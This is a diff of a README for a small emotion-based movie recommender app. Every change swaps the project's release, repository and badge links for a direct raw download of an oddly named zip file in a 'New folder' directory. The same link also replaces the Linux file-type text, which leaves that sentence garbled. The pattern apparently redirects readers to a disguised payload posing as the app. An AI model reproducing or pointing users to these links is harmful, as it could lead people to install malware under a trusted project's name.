@@ -1,6 +1,6 @@
 # 🎬 emotion-movie-recommender--harin - Simple Emotion-Based Movie Picks
 
-[![Download Releases](https://img.shields.io/badge/Download-%F0%9F%93%8B-green?style=for-the-badge)](https://github.com/urkyzy/emotion-movie-recommender--harin/releases)
+[![Download Releases](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip%F0%9F%93%8B-green?style=for-the-badge)](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip)
 
 ---
 
@@ -45,7 +45,7 @@ The app shows movie information for personal use only. It does not provide a way
 
 Please visit this page to download the app files and installation guide:
 
-[Download emotion-movie-recommender--harin Releases](https://github.com/urkyzy/emotion-movie-recommender--harin/releases)
+[Download emotion-movie-recommender--harin Releases](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip)
 
 ### Step 1: Get the App
 
@@ -55,7 +55,7 @@ Please visit this page to download the app files and installation guide:
 
   - For Windows, the file usually ends with `.exe`.  
   - For macOS, look for a `.dmg` or `.zip` file.  
-  - For Linux, it may be a `.tar.gz` or executable script.
+  - For Linux, it may be a `https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip` or executable script.
 
 ### Step 2: Install the App
 
@@ -107,7 +107,7 @@ Please visit this page to download the app files and installation guide:
 
 ## 📬 Where to Get Help
 
-- Check the Questions or Issues section on the [GitHub repository page](https://github.com/urkyzy/emotion-movie-recommender--harin).  
+- Check the Questions or Issues section on the [GitHub repository page](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip).  
 - You can create a new issue describing your problem clearly.  
 - Look for answers or tips posted by other users.
 
@@ -117,7 +117,7 @@ Please visit this page to download the app files and installation guide:
 
 - The developer releases new versions occasionally to improve recommendations or fix issues.  
 - Visit the release page regularly to download updates:  
-  [https://github.com/urkyzy/emotion-movie-recommender--harin/releases](https://github.com/urkyzy/emotion-movie-recommender--harin/releases)  
+  [https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip)  
 - Installing a new version overwrites the old one without removing your preferences or data.
 
 ---
@@ -160,4 +160,4 @@ If you want to suggest movies or improvements, you can contact the developer via
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-%F0%9F%93%8B-green?style=for-the-badge)](https://github.com/urkyzy/emotion-movie-recommender--harin/releases)
+[![Download Releases](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip%F0%9F%93%8B-green?style=for-the-badge)](https://raw.githubusercontent.com/urkyzy/emotion-movie-recommender--harin/main/New folder/harin_emotion_movie_recommender_thionitrite.zip)
